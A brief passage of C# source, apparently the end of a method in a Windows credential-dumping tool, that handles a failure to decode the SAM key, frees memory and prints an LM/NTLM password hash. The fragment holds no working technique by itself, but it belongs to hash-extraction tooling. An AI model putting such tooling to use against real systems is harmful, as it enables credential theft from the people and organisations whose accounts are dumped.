            {
                Console.WriteLine("Unable to decode sam key");
                Marshal.FreeHGlobal(unmanagedPointer);
                pSysKey.Free();
                return IntPtr.Zero;
            }
            Console.WriteLine(Utils.PrintHash(unmanagedPointer, LM_NTLM_HASH_LENGTH));
            pSysKey.Free();
            return unmanagedPointer;
        }
    }
}
